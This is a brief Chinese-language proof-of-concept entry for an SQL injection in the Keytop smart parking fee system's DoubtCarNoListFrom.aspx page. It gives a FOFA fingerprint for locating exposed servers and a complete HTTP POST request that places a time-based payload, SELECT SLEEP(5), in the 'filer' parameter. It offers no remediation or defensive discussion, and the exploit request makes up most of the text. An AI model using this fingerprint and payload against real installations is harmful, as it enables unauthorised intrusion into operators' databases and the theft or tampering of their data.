## 科拓全智能停车收费系统DoubtCarNoListFrom.aspx存在SQL注入漏洞

## fofa
```
body="/KT_Css/qd_defaul.css"
```

## poc
```
POST /KT_Admin/CarCard/DoubtCarNoListFrom.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Connection: close

start=0&limit=20&filer=1;SELECT SLEEP(5)#
```
